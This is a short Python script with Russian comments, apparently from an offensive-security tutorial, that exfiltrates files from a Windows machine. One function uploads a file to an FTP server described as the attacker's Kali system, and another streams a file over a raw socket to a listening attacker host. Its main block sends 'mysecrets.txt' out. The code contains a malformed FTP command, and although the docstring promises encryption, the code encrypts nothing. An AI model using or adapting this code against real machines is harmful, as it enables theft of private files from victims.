"""отправлять зашифрованную информацию по протоколу FTP"""
import ftplib
import os
import socket
import win32file


def plain_ftp(docpath, server='192.168.1.203'):
    """В функции plain_ftp передаем путь к файлу, который нужно отправить (docpath), и IP-адрес FTPсервера
    (системы Kali), присвоенный переменной server
    Библиотека ftplib позволяет легко соединиться с сервером, аутентифицироваться  и перейти в нужную папку , в
    которую в итоге будет записан наш файл"""
    ftp = ftplib.FTP(server)
    ftp.login("anonymous", "anon@axample.com")
    ftp.cwd('/pub/')
    ftp.storbinary("STOP" + os.path.basename(docpath), open(docpath, "rb"), 1024)
    ftp.quit()


def transmit(document_path):
    """открываем сокет для прослушивания на компьютере, который выполняет атаку, используя любой
        порт на свой выбор — здесь это порт 10000"""
    client = socket.socket()
    client.connect(('192.168.1.207', 10000))
    with open(document_path, 'rb') as f:  # используем функцию win32file.TransmitFile, чтобы передать файл
        win32file.TransmitFile(
            client,
            win32file._get_osfhandle(f.fileno()),
            0, 0, None, 0, b'', b''
        )

# В главном блоке проводится простая проверка в виде пробной отправки файла
# (в нашем случае mysecrets.txt) на прослушивающий компьютер:
if __name__ == '__main__':
    transmit('./mysecrets.txt')